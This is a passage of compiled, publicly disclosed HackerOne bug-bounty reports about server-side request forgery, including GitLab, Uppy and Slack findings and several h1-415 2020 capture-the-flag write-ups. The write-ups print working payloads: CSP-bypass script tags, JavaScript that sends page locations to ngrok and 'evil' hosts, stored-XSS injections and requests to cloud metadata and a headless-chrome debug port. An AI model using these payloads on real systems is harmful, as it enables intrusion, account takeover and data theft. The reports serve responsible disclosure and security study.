* If GitLab is hosted on Google Cloud, the above could be used to set the `Metadata-Flavor: Google` header and access `http://metadata.google.internal/`

---

### [SSRF and LFI in site-audit tool](https://hackerone.com/reports/794099)

- **Report ID:** `794099`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Semrush
- **Reporter:** @a_d_a_m
- **Bounty:** - usd
- **Disclosed:** 2020-04-30T16:36:59.630Z
- **CVE(s):** -

**Summary (team):**

SSRF and LFI vulnerability in Site Audit due to lack of connection protocol verification.

---

### [Server Side Request Forgery mitigation bypass](https://hackerone.com/reports/632101)

- **Report ID:** `632101`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** GitLab
- **Reporter:** @mclaren650sspider
- **Bounty:** - usd
- **Disclosed:** 2020-04-18T12:17:25.803Z
- **CVE(s):** CVE-2019-5464

**Vulnerability Information:**

### Summary

This vulnerability allows attacker to send arbitrary requests to local network which hosts GitLab and read the response. This is possible due to flawed DNS rebinding protection.

The attack is possible due to flaw here: https://gitlab.com/gitlab-org/gitlab-ce/blob/108c3cf16bed5733ffae086fb62c226961356560/lib/gitlab/url_blocker.rb#L59

The `validate` function performs DNS lookup to check whether the IP address of a domain belongs to the local network. If the IP address belongs to the local network, the `validate` function raises an error and no HTTP request is sent. Furthermore, `validate` returns URI as well as the IP address of the domain to protect against DNS rebinding attacks.
However, if `validate` encounters an error while resolving the domain (for example, the domain does not resolve), the DNS rebinding protection is not applied.

### Steps to reproduce
 1. Create a webhook for a repository on GitLab.com. Use the URL `http://990.hacker1.xyz`. It may return error but let's ignore it now.
 2. Wait about 10 seconds and test webhook by clicking on "Test" and "Push events".
 3. After the hook has executed, you should see content of `http://169.254.169.254` returned.

Wait about 15 seconds between testing attempts, otherwise it may not work due to DNS caching.

The code for proof-of-concept DNS server which hosts `hacker1.xyz` is attached. The PoC uses a chain of CNAME records to prevent caching.

### What is the current *bug* behavior?

The outgoing HTTP requests from webhooks can be sent to the internal network.

### What is the expected *correct* behavior?

It is expected that HTTP requests cannot be sent to the internal network.

### Relevant logs and/or screenshots

F519096
Content of `http://169.254.169.254`

F519095
Content of `http://127.0.0.1`

### Output of checks

This bug happens on GitLab.com

## Impact

Attacker can use SSRF to access sensitive information on the internal network. Furthermore, SSRF in Google Cloud can be leveraged to Remote Code Execution depending on the setup. Publicly disclosed $25,000 #341876 describes a way to gain root access to Google Cloud server via a SSRF vulnerability.

---

### [Blind SSRF at https://chat.makerdao.com/account/profile](https://hackerone.com/reports/846184)

- **Report ID:** `846184`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** BlockDev Sp. Z o.o
- **Reporter:** @losthacker
- **Bounty:** - usd
- **Disclosed:** 2020-04-14T11:32:49.287Z
- **CVE(s):** -

**Summary (team):**

Blind SSRF at https://chat.makerdao.com/account/profile

---

### [SSRF on music.line.me through getXML.php](https://hackerone.com/reports/746024)

- **Report ID:** `746024`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** LY Corporation
- **Reporter:** @hahwul
- **Bounty:** 4500 usd
- **Disclosed:** 2020-03-25T08:35:21.700Z
- **CVE(s):** -

**Summary (team):**

The reporter found an endpoint through which limited SSRF could be achieved. It was only possible to issue GET requests served over HTTPS. LFI was not possible. The maximum impact found for this issue was minor service disruption and/or limited information leakage.

---

### [Blind SSRF while Creating Templates](https://hackerone.com/reports/800909)

- **Report ID:** `800909`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Stripo Inc
- **Reporter:** @dotsecurity
- **Bounty:** - usd
- **Disclosed:** 2020-03-24T08:54:24.228Z
- **CVE(s):** -

**Summary (team):**

Blind SSRF While Creating Email Templates

---

### [SSRF in the Custom Integration Webhook discloses AWS metadata](https://hackerone.com/reports/643278)

- **Report ID:** `643278`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Dynatrace
- **Reporter:** @mohammad_obaid
- **Bounty:** 1500 usd
- **Disclosed:** 2020-03-23T16:23:12.383Z
- **CVE(s):** -

**Summary (team):**

Dynatrace allows customers to set up a webhook integration in order to automatically send updates to a specific endpoint of choice. This submission identified a way how the setup made it possible to accidentally obtain AWS metadata. Dynatrace remediated the vulnerability and found no evidence of abuse associated with it. 

This is also mentionend in https://www.dynatrace.com/support/help/whats-new/release-notes/managed/sprint-186/.

---

### [TURN server allows TCP and UDP proxying to internal network, localhost and meta-data services](https://hackerone.com/reports/333419)

- **Report ID:** `333419`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Slack
- **Reporter:** @sandrogauci
- **Bounty:** 3500 usd
- **Disclosed:** 2020-03-12T00:15:42.616Z
- **CVE(s):** -

**Vulnerability Information:**

The TURN servers used by Slack allow TCP connections and UDP packets to be proxied to the internal network. This gives an attacker the ability to scan and interact with internal systems.

The attacker may proxy TCP connections to the internal network by setting the `XOR-PEER-ADDRESS` of the TURN connect message (method `0x000A`, <https://tools.ietf.org/html/rfc6062#section-4.3>) to a private IPv4 address.

UDP packets may be proxied by setting the `XOR-PEER-ADDRESS` to a private IP in the TURN send message indication (method `0x0006`, <https://tools.ietf.org/html/rfc5766#section-10>).

Please check the attached report for additional details.

## Impact

By abusing this feature an attacker will be able to read and potentially modify sensitive information in Slack's internal infrastructure. Typically, this security vulnerability has at least the same impact as an SSRF. However it is considered more useful from an attacker's point of view since attacks are not restricted to HTTP.

The hacker selected the **Server-Side Request Forgery (SSRF)** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:

**Can internal services be reached bypassing network access control?**
Yes

**What internal services were accessible?**
Metadata, localhost, network services on the `10.0.0.0/8`

**Security Impact**
By abusing this feature an attacker will be able to read and potentially modify sensitive information in Slack's internal infrastructure. Typically, this security vulnerability has at least the same impact as an SSRF. However it is considered more useful from an attacker's point of view since attacks are not restricted to HTTP.

Note: vulnerability is not SSRF but open TURN proxy - this was the closest I could choose.

**Summary (researcher):**

TURN server allowed proxying of TCP connections and UDP packets to internal Slack network and meta-data services on AWS.

---

### [Server Side Request Forgery in Uppy npm module](https://hackerone.com/reports/786956)

- **Report ID:** `786956`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Node.js third-party modules
- **Reporter:** @3sl4m-s4l3m
- **Bounty:** - usd
- **Disclosed:** 2020-03-02T07:38:09.438Z
- **CVE(s):** CVE-2020-8135

**Vulnerability Information:**

Hi Team,

While we were testing our security engine at Shieldfy (https://shieldfy.io), We found a server side request forgery (SSRF) vulnerability in Uppy npm package.
It allows hacker to easily extract inside information from the server or take control of internal services.

# Module

**module name:**  Uppy
**version:** Latest: 1.8.0
**npm page:** `https://www.npmjs.com/package/uppy`

## Module Description

Uppy is a sleek, modular JavaScript file uploader that integrates seamlessly with any application. It’s fast, easy to use and lets you worry about more important problems than building a file uploader.

## Module Stats

[1] weekly downloads : 23,153

# Vulnerability
Server Side Request Forgery ( SSRF )

## Vulnerability Description

in the source code of the module
file: [packages/@uppy/companion/src/server/controllers/url.js line: 11](https://github.com/transloadit/uppy/blob/746bbcbbc5dc64203390322b28fb380ec67bd94f/packages/%40uppy/companion/src/server/controllers/url.js#L11)


You will find the express is routing the `/get` endpoint to the [function `get` declared in line 43](https://github.com/transloadit/uppy/blob/746bbcbbc5dc64203390322b28fb380ec67bd94f/packages/%40uppy/companion/src/server/controllers/url.js#L43)

Then it calls [`downloadURL` in line`61](https://github.com/transloadit/uppy/blob/746bbcbbc5dc64203390322b28fb380ec67bd94f/packages/%40uppy/companion/src/server/controllers/url.js#L61) and pass `req.body.url` to it as argument


in the function [`downloadURL`  declared in line 80](https://github.com/transloadit/uppy/blob/746bbcbbc5dc64203390322b28fb380ec67bd94f/packages/%40uppy/companion/src/server/controllers/url.js#L80)


It calls the url directly without any kind of sanitization or validation, opens the door to send malicious ssrf attack, allowing the hacker to extract information from any internal resource, or take control of any internal service.


## Steps To Reproduce:

1. deploy the module in live server (ex: digital ocean server)
2. request 'Add More button' then click on` Link button`
3. Submit Link of DigitalOcean metadata api `http://169.254.169.254/metadata/v1/`
4. once done uploading , download the file you should see the content of the server metadata

```
id
hostname
user-data
vendor-data
public-keys
region
interfaces/
dns/
floating_ip/
tags/
features/
```

## Patch

The suggested fix.
1. use whitelist technique in the url protocol ( allow only http & https ), and on the port ( 80 & 443 )
2. use blacklist technique in the host (disable IPs v4 & v6 allowing only domains, disable domains that used as internal routing if any)
3. disable redirection `followAllRedirects` to avoid bypasses

## Supporting Material/References:

More info about ssrf can be found here : https://shieldfy.io/security-wiki/server-side-request-forgery/server-side-request-forgery/

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

- Scan local or external network
- Read files from affected server
- Interact with internal systems
- Remote code execution

---

### [SSRF & unrestricted file upload on https://my.stripo.email/](https://hackerone.com/reports/771382)

- **Report ID:** `771382`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Stripo Inc
- **Reporter:** @abdellah29
- **Bounty:** - usd
- **Disclosed:** 2020-02-19T15:59:53.296Z
- **CVE(s):** -

**Summary (team):**

The researcher discovered an SSRF & unrestricted file upload (Remote code execution ) vulnerabilities .

---

### [[h1-415 2020] SSRF in a headless chrome with remote debugging leads to sensible information leak](https://hackerone.com/reports/781295)

- **Report ID:** `781295`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** h1-ctf
- **Reporter:** @d1r3wolf
- **Bounty:** - usd
- **Disclosed:** 2020-02-04T07:17:43.082Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Converter is using headless chrome with remote debbuging by rendring a page where we have out name, with which we can get xss leads to ssrf
By using the remote debbugging with that ssrf we can grab the info all tabs in that chrome wher we can get even the flag document.

## Steps To Reproduce:

  1. Using QR code generator (at recovery to) to take over account (jobert@mydocz.cosmic)
  2. Using xss in support by bypassing the csp using the github account , simple by backtracking in the url
  3. At the suport review, there is a idor we can change anyones name , with out character stripping (<>{}) . so we can change our name to tigger xss in pdf converter
  4. in the pdf convertor, ssrf to access the remote debbugging to leak the info

## Breif
 1. Using QR code generator (at recovery to) to take over account (jobert@mydocz.cosmic)

    While return a QR after registering it is stripping the <> chars , which help's to create recovery qr for anyones account.
we cant create a account with jobert@mydocz.cosmic mail
but we can create account with jobert@mydocz.cosmic<><> mail
after creates it returns the recover code by stripping <> means recovery code of jobert@mydocz.cosmic

 2. Using xss in support by bypassing the csp using the github account , simple by backtracking in the url
     
     After getting jobert's account we can enter the support channel, where if we gave rating 1 , our chat we be reviewed. we have xss in messages but we need to bypass the csp.
```Content-Security-Policy: default-src 'self'; object-src 'none'; script-src 'self' https://raw.githack.com/mattboldt/typed.js/master/lib/; img-src data: *```
csp is allowing the script from https://raw.githack.com/mattboldt/typed.js/master/lib/, here  we can backtrack any url upto its root(/) and github is a open source.
So we can include js file in our github account using backtracking,. csp bypassed : )
The message
```html
<script type="text/javascript" src="https://raw.githack.com/mattboldt/typed.js/master/lib/typed.js/..%252f..%252f..%252f..%252f..%252fAjay-Aj-00/Test/master/final.js"></script>
```
js file : 
```js
window.location = "https://8a7b2695.ngrok.io/record-data?name=path&data="+btoa(window.location.href)
```
as that support review link does need any login or localhost . so we can access it from outside. so grabbing that link.


 3. At the suport review, there is a idor we can change anyones name , with out character stripping (<>{}) . so we can change our name to tigger xss in pdf converter
   Support provies updating the user along with reviewsing chat
   There is idor at updating user's name (with out sanitizing <> chars) which is used at convertor
```
POST /support/review/efe74fb38a69eae74f733a3e035edf33ed14f34af0755495ff6abae219155587 HTTP/1.1
Host: h1-415.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://h1-415.h1ctf.com/support/review/88cdddff2719525210a5cdc95f3cf7f14c83f6e44caf87f5ec4255a9f69e35eb
Content-Type: application/x-www-form-urlencoded
Content-Length: 135
Origin: https://h1-415.h1ctf.com
Connection: close
Cookie: _csrf_token=46cb8a62c3c99b5d5a2c045baecf9039216a3cee; session=eyJfY3NyZl90b2tlbiI6IjQ2Y2I4YTYyYzNjOTliNWQ1YTJjMDQ1YmFlY2Y5MDM5MjE2YTNjZWUifQ.Xikx5g.KDxEtKJxN1cDleoMbr6adoqpgCs
Upgrade-Insecure-Requests: 1
.
name=<script src="https://8a7b2695.ngrok.io/static/js/new.js"></script>&user_id=18&_csrf_token=46cb8a62c3c99b5d5a2c045baecf9039216a3cee
```

## Impact

Leaking sensitive information ofusers.

---

### [[h1-415 2020] Chain of vulnerabilities leading to account takeover and unauthorized access of sensitive internal resources](https://hackerone.com/reports/781281)

- **Report ID:** `781281`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** h1-ctf
- **Reporter:** @checkm50
- **Bounty:** - usd
- **Disclosed:** 2020-02-03T21:33:38.441Z
- **CVE(s):** -

**Vulnerability Information:**

Note:
**Please read this report as "An attacker taking over a customer's account" and not as "helping Jobert recovering his document" :)**

## Summary:
Chaining following issues let's an attacker access sensitive information,
1. Exposure of customer email and regex logic error leading to account takeover
2. CSP bypass leading to arbitrary script execution on support portal and forced browsing
3. Exposure of internal host name
4. Insufficient authorization control allowing attacker to update other user's details
5. Stored XSS + SSRF leading to port scanning and access to internal resources

## Steps To Reproduce:
1. Regex logic error leading to account takeover - jobert@mydocz.cosmic email exposed in source code
   1a. 'jobert@mydocz.cosmic' seems to be a customer of MyDocz and the system does not allow any new registration with same email ID
   1b. Turn BurpSuite intercept on and capture following request,
         https://h1-415.h1ctf.com/register
   1c. Modify the email ID parameter as 'jobert@mydocz.cosmic<' , the flaw here is the QR code generation process trims following symbols 
         {<>}
   1d. Now after registration, save the QR code that the system generates
   1e. Logout of the application and navigate to https://h1-415.h1ctf.com/recover
   1f. Select the QR code saved previously and **now you have become jobert@mydocz.cosmic**

2. CSP bypass leading to arbitrary script execution on support portal and forced browsing
     2a. Support portal is vulnerable to HTML injection. One can bypass CSP rules like this
     https://raw.githack.com/mattboldt/typed.js/master/lib/@https://github.com/checkm50/checkm50.github.io/master/40.js
     2b. This triggers script execution on support portal but it is self-xss
     2c. Now right click on firefox/chrome and run following function,
           showReviewModal()
     2d. Rating 1 star makes the support agent review the chat logs and hence the script can be executed on agent's client
     2e. With a crafted script like below (Same as the script on 40.js), an attacker and gain information about the URL that the support agent 
      is using,
      ```loc = document.location
      var img1 = document.createElement('img');
      img1.src = 'http://evil/image.png?loc='+loc
      document.body.appendChild(img1);```

3. Exposure of internal host name and user agent
    3a. After performing step 2e, the attacker can now see the internal URL that the agent is using,
    https://localhost:3000/support/review/39b707f120c5fde356bf0f5daec51bee292d38862d2bc7d09ba032257365e2dd
    3b. Attacker can change the 'localhost:3000' to 'h1-415.h1ctf.com' in order to access the chat page that the support agent is viewing
 

4. Insufficient authorization control allowing attacker to update other user's details,
For further attack we need two accounts. We already have one, an attacker can also create trial account. **We will refer to this account as second account**
    4a. As you can see, the review page from step 3a. contains an option to update user details
    4b. Attacker can now update second account's "name" field, using following POST call,
          https://h1-415.h1ctf.com/support/review/39b707f120c5fde356bf0f5daec51bee292d38862d2bc7d09ba032257365e2dd
          name=<inject-here>&email=jobert%40mydocz.cosmic&username=jobert&user_id=<second account user_id>&_csrf_token=987d

5. Stored XSS + SSRF leading to port scanning and access to internal resources
     5a. From step 4b, we know that an attacker has to ability to update account information of another user
     5b. This becomes worst because the attacker is also able to inject script like below
     name=<script src='external.com/some.js'>&email=jobert%40mydocz.cosmic&username=jobert&user_id=6&_csrf_token=987d
     5c. An attacker can use this to inject an iframe like below and escalate the situation to SSRF (Port scanning and access internal resource)
     name=<iframe src='http://localhost:9222/json' width=900 height=900></iframe>
     5d. 9222 port because the user-agent says that it is headless chrome hence 9222 which is the debugger port
     5e. the /json end point reveals a secret document

The secret document contains,
## h1ctf{y3s_1m_c0sm1c_n0w}

## Supporting Material/References:
1. Support-portal.png
2. chat-review-page.png
3. external-interaction-ssrftest.png
4. user-update-ssrf.png
5. The-FLAG.png

Special thanks to @pirateducky, @almadjus and @mcipekci  :)

##Remediation:
Hire me :)

## Impact

An attacker is able to, 
achieve **take over of customers account**, 
**compromise the integrity** of the platform by updating other user accounts
**Infiltrate into internal network**
resulting in **Critical** impact

---

### [[H1-415 2020] CTF Writeup](https://hackerone.com/reports/776634)

- **Report ID:** `776634`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** h1-ctf
- **Reporter:** @manoelt
- **Bounty:** - usd
- **Disclosed:** 2020-02-03T21:16:18.224Z
- **CVE(s):** -

**Vulnerability Information:**

As there is a bonus for the first solver, I am sending only the flag for now.

{F687111}

## Impact

.

---

### [[h1-415 2020] Multiple vulnerabilities leading to leaking of secret user files](https://hackerone.com/reports/780036)

- **Report ID:** `780036`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** h1-ctf
- **Reporter:** @nukedx
- **Bounty:** - usd
- **Disclosed:** 2020-02-03T20:35:38.846Z
- **CVE(s):** -

**Vulnerability Information:**

Hello,

I'm just submitting both flags for CTF, will send my write up on hacker summary, since it's 7:00 am now :).

Original flag for CTF: `h1ctf{y3s_1m_c0sm1c_n0w}`
Extra flag for unintended account takeover: `h1ctf{wtf_1s_happ3ning_w1th_th1s_s1mulat1on}`

Sincerely,
@nukedx

## Impact

By chaining multiple vulnerabilities attacker can leak secret user files.

**Summary (researcher):**

## Beginning of event
This is my friend Jobert:

{F692973}

On January 16th, HackerOne's official twitter account posted a tweet about Jobert lost access to his account and lost an important document. Which stumbled upon on me. I wanted to help my friend and started to check service provider located on https://h1-415.h1ctf.com

## Analysing the target with visual recon

Started to check https://h1-415.h1ctf.com with visual recon, noticed that some customers had their testimonials, interestingly Jobert provided one too. While inspecting his testimonial noticed he had email address referenced for it.
{F692986}

Email address referenced was: `jobert@mydocz.cosmic`

Since everyone could sign-up to the service, I tried to register with `jobert@mydocz.cosmic` as email address and got an error **Something went wrong, please try again with a different email address or username.**.

It was clear that Jobert's email on testimonial was used. So registered an account with my own email, after successfully registering account a QR code generated by service and mentioned that it could be used for recovering the account: `Please take some time to save this QR code if you ever need to recover your account in the future.`, saved the QR and moved to analyse features on service.

There was a support page which was clearly mentioning: `Support chat is available for customers only.` Since account we created was trial account we were not qualified for it, that looks like some feature we must check later on.

Moved to settings feature and it was having an option to change our name, decided to check if it's sanitizing special chars to prevent potential attacks, it was sanitizing following characters: `<>{}`. Therefore using it for any kind of stored XSS was not possible, also tried to see the limit on character length for username, noticed that whenever we exceed 128 chars it was giving internal server error, noted it down and moved to next feature.

Converter feature clearly mentioned that we can only upload following file types: **PNG** and **JPG** but only thing it was doing checking file extension, so it was possible to upload any content with that extensions but looks like pdf generation was just referencing them from `<img>` tag on page it renders so it wasn't possible to abuse it unless we can find some LFI.

Since we noticed character length limit on username, decided to check it on for other fields of the register page, looks like it was also applied for email and username as well, also it was possible to create an account with empty username.

Only thing left to check was how user session handled, looks like session cookie set as **HttpOnly** so leaking it with any stored XSS would nearly impossible unless we find an endpoint sending it as a response and `_csrf_token` is just used for a regular anti-CSRF mechanism.

## Using data gained from visual recon 

So far we found out potential email address of Jobert's account, account recover mechanism with QR code, session cookie is HttpOnly, character limits on email, name and username of account.

Started with analysing session cookie, session cookie looked like Flask cookie and decoding it actually revealed something interesting for doing it used **flask-unsign**.
```
flask-unsign --unsign --cookie .eJxdy8EKwjAMANB_yXlI06at7cn_EClZlqHoNlnrQcR_d-BJj-_wXlCkrmNpy1VnyECcQkzWR6HBhGSIxbDrESlhb8l5GREHNtCBnLlBPp460Ikvty03rQ2tIx_iPh1-tJNl2s6j6lra866Q3VczT_pf4f0BC4UsGQ.Xid9Mg.l1KyB_ywBm-_bhoHx86iKQnMgvc

[*] Session decodes to: {'_csrf_token': '4a9679257c4d06904ac0a3b11491b2435cf11da0', 'chat': [], 'email': 'test123456789@test123456789.com', 'user_type': 3, 'username': 'test123456789'}
```
It was clear that session cookie do not store users password, which is good to know but since we do not have the secret key for it, it was impossible to generate a new one.

Decided to decode QR code, for it just used online service from [ZXing](https://zxing.org/w/decode.jspx):
```
7465737431323334353637383940746573743132333435363738392e636f6d:f7ab97879d467bace879071789e097ed65508b93399941854c76a1e353b1df4a7b8259faefbaacbdf8686afbcb65ee03b7e10c3e58b4f47b7ffa4c277fb7a9ae8ade8e3316737c83406a643e3f99106cfb824287c28004a1aa1b417d102db69b641b7a2fdad1bdd699efe13cd0671df265f4efe02efa6af8004b73bd270545d7
```

Which looked like bunch of hashes dancing together, except there was a semicolon between them, so checked first part which was not fitting any known hash length, it was clearly hex values of email address I used: `test123456789@test123456789.com`

So decided to create a new QR code with Jobert's email via using [QR code generator](https://www.the-qrcode-generator.com/):

```
6a6f62657274406d79646f637a2e636f736d6963:f7ab97879d467bace879071789e097ed65508b93399941854c76a1e353b1df4a7b8259faefbaacbdf8686afbcb65ee03b7e10c3e58b4f47b7ffa4c277fb7a9ae8ade8e3316737c83406a643e3f99106cfb824287c28004a1aa1b417d102db69b641b7a2fdad1bdd699efe13cd0671df265f4efe02efa6af8004b73bd270545d7
```

When used new generated QR, got an error: `Invalid code` it was clear that we should find a way to recover that account.

## Discovering ways to account takeover

Since QR code we generated failed decided to mess with register page, so far we know character limit and sanitized characters.

First way I tried was sending null-byte and new line characters at the end of email address, noticed I was able to create accounts with them but they were included on cookie like:
```
{'_csrf_token': '20bc6e86d195d103d2d8bfe132cf9484e6cc4bf7', 'chat': [], 'email': 'jobert@mydocz.cosmic\n', 'user_type': 3, 'username': '1'}
```

So it wasn't actually checking if there was invalid character at the end of email address but failed, I decided to use an old trick from early 2000s filling it with spaces till 128th char and putting new line at the end as 129th char.

Request payload looked like this: 
```
POST /register HTTP/1.1
Host: h1-415.h1ctf.com
Connection: close
Content-Length: 273
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://h1-415.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4017.0 Safari/537.36 Edg/81.0.389.2
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://h1-415.h1ctf.com/register
Accept-Encoding: gzip, deflate
Accept-Language: tr,en-US;q=0.9,en;q=0.8
Cookie: _csrf_token=3390a87b98128fe01be7fa3f615aced12ea1dae1; session=eyJfY3NyZl90b2tlbiI6IjMzOTBhODdiOTgxMjhmZTAxYmU3ZmEzZjYxNWFjZWQxMmVhMWRhZTEifQ.XiV2HQ.n04p8L9_-rBZgpUq6FCI-LoRelc

name=test&email=jobert@mydocz.cosmic+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++%0a&username=13&password=test123456789&password-confirmation=test123456789&_csrf_token=3390a87b98128fe01be7fa3f615aced12ea1dae1
```

Interestingly that worked like a charm and I was able to register account with it and session cookie looked like this:

```
{'_csrf_token': '3390a87b98128fe01be7fa3f615aced12ea1dae1', 'chat': [], 'email': 'jobert@mydocz.cosmic                                                                                                            \n', 'user_type': None, 'username': None}
```

It somehow didn't have user_type and username.

I was able to login with jobert@mydocz.cosmic with password test123456789 but this didn't feel like intended way. Since I was able to make another jobert@mydocz.cosmic account with different password and being able to login with both but not actually with jobert's username by using the passwords. It looked like some issue on backend actually was causing it, even session cookie was able to confirm it, since it had all the spaces.

When logged in session cookie was like this:
```
{'_csrf_token': '3390a87b98128fe01be7fa3f615aced12ea1dae1', 'chat': [], 'email': 'jobert@mydocz.cosmic                                                                                                            ', 'user_type': 2, 'username': 'jobert'}
``` 

It clearly removed **\n** but was filled with spaces.

Since Jobert's user_id was 2, there should be another account I tried `admin@mydocz.cosmic` for it and I was actually able to takeover it too and it's userid was 1 but there wasn't so much to do with it, later reported it and this was actually unintended way to take account as mentioned on:

{F692181}

So there should be also intended way to takeover Jobert's account since we could add any char at the end of email I wanted to add sanitized chars like `<<`

We got a new QR code for registering an account:

{F692972}

When decoded it looked like this: 
```
6a6f62657274406d79646f637a2e636f736d6963:c2fc8b13780eeced250ec5daf3a47451b3ad412b9ecd2cd4a70c0de3a8ee9043212c7d5a0d20bc0c67095f2b876ab83cdc9e20747bb44bfe33ebf0ebac715133d33537477d9c999c41efa1321534e75877ba1b298276123136774db04a6623677afb1db708b0517a11487007dfc72a6909a4815ed86b3eb9d74e029cf2be91bb
```

Result was perfect we were able to generate valid QR code for Jobert's email and `<<` got sanitized, now we need to test if we can login with it and when logged in session cookie looked like this: 
```
{'_csrf_token': 'ac1ea8ac0e6c6931243e9928f067212c0d899a3d', 'chat': [], 'email': 'jobert@mydocz.cosmic', 'user_type': 2, 'username': 'jobert'}
```

So it was successful and we are now able to login with Jobert's account by using QR code.

Interestingly session cookie of original account of the which generated QR looked liked this:
```
{'_csrf_token': 'ac1ea8ac0e6c6931243e9928f067212c0d899a3d', 'chat': [], 'email': 'jobert@mydocz.cosmic<<', 'user_type': 3, 'username': 'test1234567891'}
```

So unintended way actually doing weird interactions with backend and potentially database server itself, because unlike sanitized versions cookie unintended way was missing user_type and username values on cookie.

## Checking new features

Since I was able to login as Jobert first thing I checked was documents but looks like we got rick rolled there is no documents on that account. 

Jobert's account had access for the support since he was legit customer and support chat looks like vulnerable to stored XSS but due to CSP filters we can't use scripts unless we bypass it.

According to this script when we rate support we received with 1 star a support person will review it.

```javascript
    $("#rating-input").val(rating), 1 === rating && $("#report-message").text("We're sorry about that. Our team will review this conversation shortly."), $("#review-button").attr("disabled", !1)
```

By simply using "<img>" I verified that I received a new connection on it with interesting user-agent:

```
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36
```

So decided to check CSP filters, seeing that `https://raw.githack.com/mattboldt/typed.js/master/lib/` allowed to reference scripts checked [GitHack](https://raw.githack.com), I could reference my own github but link looked like `https://raw.githack.com/mcipekci/ch/master/c.js`

For fooling browser I decided to use double encoding because backend will replace %2F with / so needed to have %2F on browser therefore when it makes request to githack, will remove trailing slashes so first payload looked like:

```
<script src="https://raw.githack.com/mattboldt/typed.js/master/lib/..%252f..%252f..%252f..%252fmcipekci/ch/master/c.js"></script>
```

This was bypassing it but there was another trick too (thanks to checkm50)

```
<script src="https://raw.githack.com/mattboldt/typed.js/master/lib/@https://raw.githubusercontent.com/mcipekci/ch/master/c.js"></script>
```

With both ways I was able to execute scripts but due to CSP filters we couldn't exfill data via XHR and since session cookie was HttpOnly, it wasn't worth to get that cookie, only thing left is getting address of support.

```javascript
var img = document.createElement('img'); 	
img.src = 'https://473610be.ngrok.io/w.png?c='+document.location;
document.body.appendChild(img);
```

By using this I was able to locate supports address

```
GET /w.png?c=http://localhost:3000/support/review/1194a0909bd5e05ded45214d54c559e708cd2131488a483b350ceedbbbbc7ddf HTTP/1.1
Host: 473610be.ngrok.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: no-cors
Referer: http://localhost:3000/
Accept-Encoding: gzip, deflate, br
X-Forwarded-Proto: https
X-Forwarded-For: 18.218.90.126
```

{F694403}
Things started to look interesting support page looks like was vulnerable to improper access control, so whoever had address of the page can access it but whenever we tried to save user it was giving can't update this user error.

## Chaining IDOR and stored XSS to finding missing file via SSRF

Since I had the link of supports review page noticed that there was a `user_id` parameter decided to change it to my trials user id and realised that unlike register and users own settings page no sanitize applied for special chars on users name but payload was limited, so used `<script>` tag to load remote javascript, since pdf generators ignore CSP rules but directly rely html code for rendering, I used script from my own server.

```
POST /support/review/1194a0909bd5e05ded45214d54c559e708cd2131488a483b350ceedbbbbc7ddf HTTP/1.1
Host: h1-415.h1ctf.com
Connection: close
Content-Length: 123
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://h1-415.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4017.0 Safari/537.36 Edg/81.0.389.2
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://h1-415.h1ctf.com/support/review/1194a0909bd5e05ded45214d54c559e708cd2131488a483b350ceedbbbbc7ddf
Accept-Encoding: gzip, deflate
Accept-Language: tr,en-US;q=0.9,en;q=0.8
Cookie: _csrf_token=43701321f1d6febd05143e22473097dbd0ad2adf; session=eyJfY3NyZl90b2tlbiI6IjQzNzAxMzIxZjFkNmZlYmQwNTE0M2UyMjQ3MzA5N2RiZDBhZDJhZGYifQ.Xih9mg.4crzJQ_QGe46WyBiGGEg_P266Rs

name=<script src="http://worker.nukedx.com/t4.js"></script>&user_id=11&_csrf_token=43701321f1d6febd05143e22473097dbd0ad2adf
```

